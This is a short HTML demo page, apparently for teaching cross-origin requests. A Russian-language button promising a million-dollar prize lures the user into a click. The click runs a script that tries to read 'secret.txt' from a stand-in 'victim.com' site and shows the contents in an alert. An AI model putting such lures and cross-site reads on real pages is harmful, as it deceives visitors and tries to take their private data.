<!DOCTYPE html><html><head><title>Geek Document</title>
</head>
<body>
    <script>

        function xhrGeek() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://victim.com/secret.txt", false);
            xhr.send();

            if (xhr.status != 200) {
                alert(xhr.status + ': ' + xhr.statusText);
            } else {
                alert(xhr.responseText);
            }
        }
    </script>
    <button onclick="xhrGeek()">Вы выиграли $1 000 000!!! Нажмите, чтобы получить ваш выигрыш.</button>
</body>
</html>
